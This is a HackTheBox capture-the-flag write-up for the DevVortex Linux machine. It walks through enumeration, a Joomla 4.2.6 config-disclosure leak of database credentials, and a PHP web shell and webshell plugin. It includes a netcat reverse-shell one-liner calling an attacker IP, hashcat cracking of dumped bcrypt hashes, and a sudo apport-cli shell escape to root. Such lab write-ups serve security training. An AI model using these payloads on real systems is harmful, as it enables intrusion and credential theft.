---
layout: post
title: HTB DevVortex WriteUp
date: 2024-05-23
categories:
  - HackTheBox
  - HackTheBox-Linux
tags:
  - HackTheBox
  - CTF
  - Linux
  - Joomla
  - OSCP
  - MySQL
  - Password-Cracking
  - Apport-CLI-Binary
  - "#Virtual-Hosting"
media_subpath: /assets/img/Devvortex/
---

![Desktop View](Devvortex.png){: w="800"  h="400" }

#### DevVortex Skills

>DevVortex is an easy Linux machine where we will use the following skills:

-  **Port Discovery**
-  **Subdomain Fuzzing**
-  **Joomla Enumeration**
-  **Joomla Information Disclosure**
-  **Modifying Joomla Extension**
-  **Password Re-utilization** 
-  **Basic MySQL Syntax**
-  **Cracking Password with Hashcat**
-  **Abusing Apport-CLI Binary - Sudoers**

---
## IP Address Enumeration

Using the usual Nmap scan I've discovered port **22** & port **80**:

```perl
nmap -p- --open -sS --min-rate 10000 -vvv -n -Pn 10.10.11.242
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-23 19:44 CEST
Initiating SYN Stealth Scan at 19:44
Scanning 10.10.11.242 [65535 ports]
Discovered open port 80/tcp on 10.10.11.242
Discovered open port 22/tcp on 10.10.11.242
```

Then i launched a basic group of scripts to seek more info from the open ports:

```perl
nmap -sCV -p22,80 10.10.11.242
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-23 19:52 CEST
Nmap scan report for 10.10.11.242
Host is up (0.078s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devvortex.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Taking a look at the port 80, we are being redirected to ***http://devvortex.htb***, so i added the URL to my */etc/hosts*:

```bash
echo "10.10.11.242 devvortex.htb" | tee -a /etc/hosts
```
---

## Web Enumeration

Once we enter in http://devvortex.htb we are in front of the following website.

![Desktop View](principalPage.png)

---
### Fuzzing Directories

After trying all the features in the website & some usual files like: **robots.txt**, nothing looks useful, so i tried fuzzing the website, in order to seek hidden folders:

```bash
ffuf -c -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://devvortex.htb/FUZZ -t 100
```

After some time the only found folders were the following ones:

```java
images                  [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 131ms]
css                     [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 159ms]
js                      [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 138ms]
```

Those folders are not even worth looking, so at this point my best option is to fuzz subdomains, this is usually made with `gobuster vhost` but i really like `ffuf`.

---
### Fuzzing Subdomains

In order to **brute-force** subdomains with **ffuf** we have to specify a `Host:` header:

```bash 
ffuf -c -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.devvortex.htb" -u http://devvortex.htb/ -t 100
```

After executing, you will see tons of `200 OK` so just filter by the size of the responses using `-fs number`.

```bash
ffuf -c -fs 154 -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.devvortex.htb" -u http://devvortex.htb/ -t 100
```

After a few seconds we obtain a response, there is a `dev.devvortex.htb`, so as above we have to add it to `/etc/hosts`.

```bash
echo "10.10.11.242 dev.devvortex.htb" | tee -a /etc/hosts
```

---
## Subdomain Enumeration

After entering the new subdomain, we seen a website similar to `http://devvortex.htb`, so i suppose that is a **pre-production** website.

Taking a look into the features of the website, nothing looks exploitable but [Wappalyzer](https://www.wappalyzer.com/) report that we are against a [Joomla CMS](https://supporthost.com/what-is-joomla/), so this is a good enumeration vector.

Also there is a **robots.txt** with some paths:

```
# https://www.robotstxt.org/orig.html

User-agent: *
Disallow: /administrator/
Disallow: /api/
Disallow: /bin/
Disallow: /cache/
Disallow: /cli/
Disallow: /components/
Disallow: /includes/
Disallow: /installation/
Disallow: /language/
Disallow: /layouts/
Disallow: /libraries/
Disallow: /logs/
Disallow: /modules/
Disallow: /plugins/
Disallow: /tmp/
```

---
### Enumerating Joomla

>_I'm not really a fan of CMS automated tools as Joomscan & Droopescan. This is because they make tons of noise and useless requests_

So the first thing i need to know is the **Joomla version**, there are multiple files in a Joomla website, that can snitch us the version:

-  http://dev.devvortex.htb/administrator/manifests/files/joomla.xml
-  http://dev.devvortex.htb/language/en-GB/en-GB.xml
- http://dev.devvortex.htb/plugins/system/cache/cache.xml  // I do not recommend trusting this source.

_Beside the version, take a look to the `joomla.xml` cause usually is gold mine_

After looking at the `joomla.xml`, we found that the Joomla Version is `4.2.6`.

---
### Exploiting Joomla

Let's use `searchsploit` to see if there is any associated vulns to this version.

```bash
searchsploit joomla 4.2
------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                        |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Joomla! Component com_civicrm 4.2.2 - Remote Code Injection                                                                                           | php/webapps/24969.txt
Joomla! Component Google Map Landkarten 4.2.3 - SQL Injection                                                                                         | php/webapps/44113.txt
Joomla! Component ionFiles 4.4.2 - File Disclosure                                                                                                    | php/webapps/6809.txt
Joomla! Component jDownloads 1.0 - Arbitrary File Upload                                                                                              | php/webapps/17303.txt
Joomla! Component MaQma Helpdesk 4.2.7 - 'id' SQL Injection                                                                                           | php/webapps/41399.txt
Joomla! Component mydyngallery 1.4.2 - SQL Injection                                                                                                  | php/webapps/7343.txt
Joomla! com_hdwplayer 4.2 - 'search.php' SQL Injection                                                                                                | php/webapps/48242.txt
Joomla! v4.2.8 - Unauthenticated information disclosure                                                                                               | php/webapps/51334.py
------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

There is a  **Unauthenticated information disclosure** for the `4.2.8` version,  so  it may be vulnerable because our version is older.

Analyzing the attached python script, we have to make a request throw the API to the following path:

- `http://dev.devvortex.htb/api/index.php/v1/config/application?public=true`

This will leak the system's configuration, which contains the Joomla! **MySQL database credentials** in plaintext.

Taking a look to the dump, we will see a User & a Password:

-  **Lewis -> P4ntherg0t1n5r3c0n##**

Although these credentials are from the MySQL Database, we can try using them in the **/administrator** page.

After submitting the credentials we are inside the administrative Joomla instance :)

---

### Exploiting Administrative Joomla Instance

Taking a look i found two users registered:

![Desktop View](Users.png)

Now on we have to find a way to get RCE, so i found two ways to achieve RCE:

-  **Via Template**
-  **Via Extension-Plugin**

Since Joomla is made in PHP, we can add PHP code to any Plugin or Template.

-- -
#### Template Modification 

In order to modify a Joomla Template go to *System -> Site Templates* and select any template, then use any php file already configures, usually `index.php` works well, so just add a then next PHP line in the bottom of the index.php & save.

```php
<?php system($_GET['cmd']); ?>
```

Then just go to */index.php* and use the usual reverse shell with `netcat`:

```bash
curl -s -X GET http://dev.devvortex.htb/index.php?cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>%261|nc 10.10.16.5 443 >/tmp/f
```

_Remember to URL-encode every '&' in the reverse shell_

Unfortunately this usually does't work, it execute commands but somehow it does not send the reverse shell.

---
#### Adding a Web-Shell Plugin

I like to use **p0dalirius** project, this project give us RCE and some extra features:

- [https://github.com/p0dalirius/Joomla-webshell-plugin](https://github.com/p0dalirius/Joomla-webshell-plugin)

Just clone the repository locally:

```bash
git clone https://github.com/p0dalirius/Joomla-webshell-plugin.git
```

In order to add this plugin go to *System -> Extension*, then select the `joomla-webshell-plugin-1.1.0.zip` and it will automatically install, now on you can execute commands from this URL:

-  http://dev.devvortex.htb/modules/mod_webshell/mod_webshell.php?action=exec&cmd=id

_A good thing also is you can see stderr of the commands cause you are operating from the API_

![Desktop View](RCE.png)

So just execute the usual reverse shell and set a listener.

```
http://dev.devvortex.htb/modules/mod_webshell/mod_webshell.php?action=exec&cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>%261|nc 10.10.16.5 443 >/tmp/f
```

```bash
nc -nlvp 443
```

And there we go, we got access to the machine.

![Desktop View](Reverse.png)

-- -
## Shell as Logan

### TTY Treatment 

Once we get the reverse shell, let's find a way to scale privileges, but before, we have to get a fully interactive shell, there are multiple ways but i like to do it this way: 

```bash
script /dev/null -c bash
```

Then press *Ctrl+Z* to get the process in background.

Now that you are in your machine execute the next command:

```bash
stty raw -echo;fg
```

Now write `reset xterm` and you should have a better looking shell but you still have to execute a few commands:

```bash
export TERM=xterm
export SHELL=bash
stty rows 45 columns 184
```

Make a `stty size` in your own shell to know the rows and columns.

---
### Getting Hashes from MySQL

After trying some ways like checking sudoers, SUID, CRON Jobs and Capabilities i found nothing, so i remembered that i got the MySQL user & password.

Executing `netstat -nat` i see a **3306** Port open, so i will try to connect to the MySQL database:

```bash
mysql -u lewis -p'P4ntherg0t1n5r3c0n##'
```

```sql
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| joomla             |
| performance_schema |
+--------------------+
```

Inside Joomla Database there are over 70 tables but one of the most interesting ones is `sd4fg_users`

```sql
mysql> show tables;
+-------------------------------+
| Tables_in_joomla              |
+-------------------------------+
| sd4fg_action_log_config       |
| sd4fg_action_logs             |
| sd4fg_action_logs_extensions  |
| sd4fg_action_logs_users       |
| sd4fg_assets                  |
| sd4fg_users                   |
+-------------------------------+
```

And inside this table there is 7 columns one of them named `password` so getting the data inside password i get the next output:

```sql
mysql> select name,username,password from sd4fg_users;
+------------+----------+--------------------------------------------------------------+
| name       | username | password                                                     |
+------------+----------+--------------------------------------------------------------+
| lewis      | lewis    | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u |
| logan paul | logan    | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 |
+------------+----------+--------------------------------------------------------------+
```

---
### Cracking Logan Hash

Using [Hash Identifier](https://hashes.com/en/tools/hash_identifier) we can try to see what encryption method the hash is using.

```bash
$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 - Possible algorithms: bcrypt $2*$, Blowfish (Unix)
```

It says `Possible algorithm` but i will trust it.

Seeing what number code is assigned to `bcrypt $2*$, Blowfish (Unix)` in hashcat it said 3200, so with the following command we can try to crack the hash.

```bash
hashcat -m 3200 hash /usr/share/wordlists/rockyou.txt 
```

After a while we found the next password:

```bash
$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12:tequieromucho
```

Now we can try to change to Logan.

```bash
www-data@devvortex:/$ su logan
Password: tequieromucho
logan@devvortex:/$ 
```

Now we can read the `user.txt` inside `/home/logan`.

![Desktop View](user.png)

----
## Shell as Root

### Abusing Apport-CLI Sudoers

Making a `sudo -l` to see if we can run any binary as root we see that we can execute a binary named `apport-cli`.

```bash
logan@devvortex:/$ sudo -l
User logan may run the following commands on devvortex:
    (ALL : ALL) /usr/bin/apport-cli
```

Taking a look in Google for exploits associated to `apport-cli` i found that it's a report manager and that we can use option `-V` we can spawn a shell.

```bash
sudo /usr/bin/apport-cli -c /var/crash/some_crash_file.crash
press V (view report)
!/bin/bash
```

But first we have to generate a report under `/var/crash` so i created a file named `crash.crash`  and re-run the command.

```bash
sudo /usr/bin/apport-cli -c /var/crash/crash.crash

*** Error: Invalid problem report

This problem report is damaged and cannot be processed.

ValueError('Report does not contain "ProblemType" field')
```

It said that need a ProblemType field so i added it to the file and re -run it again.

```bash
sudo /usr/bin/apport-cli -c /var/crash/crash.crash

*** Error: Invalid problem report

This problem report is damaged and cannot be processed.

ValueError('not enough values to unpack (expected 2, got 1)')
```

Now it need another value so i added a string next to ProblemType and re-run it again.

```crash.crash
ProblemType: test
```

```bash
sudo /usr/bin/apport-cli -c /var/crash/crash.crash
*** Send problem report to the developers?

After the problem report has been sent, please fill out the form in the
automatically opened web browser.

What would you like to do? Your options are:
  S: Send report (0.0 KB)
  V: View report
  K: Keep report file for sending later or copying to somewhere else
  I: Cancel and ignore future crashes of this program version
  C: Cancel
Please choose (S/V/K/I/C): V
!/bin/bash
root@devvortex:/var/crash#
```

Now we can read the `root.txt` inside `/root/`.

![Desktop View](root.png) 

---

  ![Desktop View](pwned.png)
 
---
***Thanks for reading, i'll appreciate that you take a look to my other posts  :)***
